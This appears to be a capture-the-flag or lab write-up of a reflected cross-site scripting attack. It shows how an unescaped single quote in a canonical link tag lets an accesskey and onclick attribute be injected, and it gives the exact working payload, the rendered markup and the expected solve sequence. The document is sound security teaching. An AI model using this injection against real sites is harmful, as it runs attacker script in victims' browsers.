# Attack Chain — accesskey-triggered handler in canonical link tag

## Data flow
```
Attacker crafts URL   /?'accesskey='x'onclick='alert(1)
   │  (transport: %27 for quotes; server decodes once into the echo)
   ▼
[INPUT] GET /?'…'  →  server builds canonical from the full request URL,
URL-encoding " < > (%22 %3c %3e) but passing ' through raw
   │
   ▼
[PROCESSING] template:  <link rel="canonical" href='URL'/>
   │  rendered (byte-verified): <link rel="canonical" href='https://…/?'accesskey='x'onclick='alert(1)'/>
   │    href='…/?' + accesskey='x' + onclick='alert(1)' + />
   ▼
[SINK] victim parser: inert <link> element carrying a live onclick + accesskey
   │
   ▼
[EVENT GATE] platform-simulated user presses ALT+SHIFT+X (or CTRL+ALT+X / Alt+X):
accesskey dispatches a synthetic CLICK on the link element
   │
   ▼
[TRUST BOUNDARY CROSSED] click handler runs attacker JS in page origin
   ▼
RESULT: alert(1) → is-solved (first poll)
```

## Why this shape (constraint-satisfying)
- Tags impossible: `<>` arrive percent-encoded (`%3c%3e` stay literal in markup —
  the HTML parser never decodes them into tags). No breakout, no new elements.
- `"` impossible as delimiter-breaker: arrives as literal `%22` text inside the value.
- `'` raw: the ONLY breakout char — and the href is single-quoted, so exactly one
  injection point exists (attribute injection, never tag injection).
- `<link>` is non-rendered and non-focusable: `autofocus`/`onfocus`/`onmouseover`
  cannot fire without interaction machinery — but `accesskey` + `onclick` converts a
  KEYPRESS into a CLICK, and the platform supplies the keypress.
- Inner quotes unnecessary: `alert(1)` takes no string args — the payload uses ZERO
  nested quotes, dodging the quote-accounting traps of prior labs entirely.

## Expected response sequence (verified)
1. `GET /?'accesskey='x'onclick='alert(1)` → 200, breakout bytes in canonical tag.
2. Real-browser navigation → platform simulates the access-key combo.
3. Synthetic click → `onclick` fires → `alert(1)` → `is-solved`.